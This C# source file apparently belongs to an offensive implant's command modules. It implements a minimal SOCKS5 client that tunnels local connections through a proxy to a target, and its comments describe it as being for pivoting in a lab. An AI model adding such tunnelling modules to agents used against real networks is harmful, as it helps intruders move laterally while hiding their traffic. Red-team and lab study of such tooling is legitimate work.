// SocksProxy.cs
// Implements SOCKS4/5 client handler for pivoting

using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace Agent.CommandModules
{
    public static class SocksProxy
    {
        // Minimal SOCKS5 client for lab use
        public static string Start(string arg)
        {
            // arg: "localPort,socksServer,socksPort,targetHost,targetPort"
            try
            {
                var parts = arg.Split(',');
                int localPort = int.Parse(parts[0]);
                string socksServer = parts[1];
                int socksPort = int.Parse(parts[2]);
                string targetHost = parts[3];
                int targetPort = int.Parse(parts[4]);

                Thread t = new Thread(() => RunSocks(localPort, socksServer, socksPort, targetHost, targetPort));
                t.IsBackground = true;
                t.Start();
                return $"SOCKS proxy started on 127.0.0.1:{localPort} -> {targetHost}:{targetPort} via {socksServer}:{socksPort}";
            }
            catch (Exception ex)
            {
                return "SOCKS proxy error: " + ex.Message;
            }
        }

        private static void RunSocks(int localPort, string socksServer, int socksPort, string targetHost, int targetPort)
        {
            TcpListener listener = new TcpListener(IPAddress.Loopback, localPort);
            listener.Start();
            while (true)
            {
                using (TcpClient client = listener.AcceptTcpClient())
                using (TcpClient proxy = new TcpClient(socksServer, socksPort))
                using (NetworkStream cstream = client.GetStream())
                using (NetworkStream pstream = proxy.GetStream())
                {
                    // SOCKS5 handshake
                    pstream.Write(new byte[] { 0x05, 0x01, 0x00 }, 0, 3); // no auth
                    pstream.ReadByte(); pstream.ReadByte();
                    // Connect command
                    byte[] hostBytes = System.Text.Encoding.ASCII.GetBytes(targetHost);
                    byte[] req = new byte[7 + hostBytes.Length];
                    req[0] = 0x05; req[1] = 0x01; req[2] = 0x00; req[3] = 0x03; // domain
                    req[4] = (byte)hostBytes.Length;
                    Array.Copy(hostBytes, 0, req, 5, hostBytes.Length);
                    req[5 + hostBytes.Length] = (byte)(targetPort >> 8);
                    req[6 + hostBytes.Length] = (byte)(targetPort & 0xFF);
                    pstream.Write(req, 0, req.Length);
                    pstream.Read(new byte[10], 0, 10); // response
                    // Relay
                    Thread t1 = new Thread(() => Relay(cstream, pstream));
                    Thread t2 = new Thread(() => Relay(pstream, cstream));
                    t1.Start(); t2.Start();
                    t1.Join(); t2.Join();
                }
            }
        }

        private static void Relay(NetworkStream src, NetworkStream dst)
        {
            try
            {
                byte[] buf = new byte[4096];
                int n;
                while ((n = src.Read(buf, 0, buf.Length)) > 0)
                {
                    dst.Write(buf, 0, n);
                }
            }
            catch { }
        }
    }
}
